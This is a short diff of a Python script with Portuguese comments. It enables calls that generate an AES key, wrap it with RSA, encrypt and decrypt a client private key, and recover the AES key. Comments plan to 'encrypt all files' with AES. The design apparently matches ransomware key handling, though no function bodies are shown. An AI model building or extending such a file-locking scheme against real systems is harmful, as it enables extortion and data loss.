@@ -109,15 +109,24 @@ def gera_chave_AES():
 
 
 # MAIN
-#AES_key=gera_chave_AES()
+AES_key=gera_chave_AES()
 #print('[*] chave AES gerada')
 #menu() # -> criptografa tudo
 
-#AES_to_RSA()
+AES_to_RSA()
 #print('[*] chave AES criptografado com RSA keys')
 
-#RSA_to_AES()
 
+RSA_to_SRSA()
+#print('[*] chave privada do cliente criptografada')
+SRSA_to_RSA()
+#print('[*] chave privada do cliente descriptografada')
+RSA_to_AES()
+#print('[*] chave AES descriptografada')
+print('tudo certo')
+
+
+# == ALGORITMO ==
     # criptografa todos os arquivos com AES
 
     # criptografa a chave AES
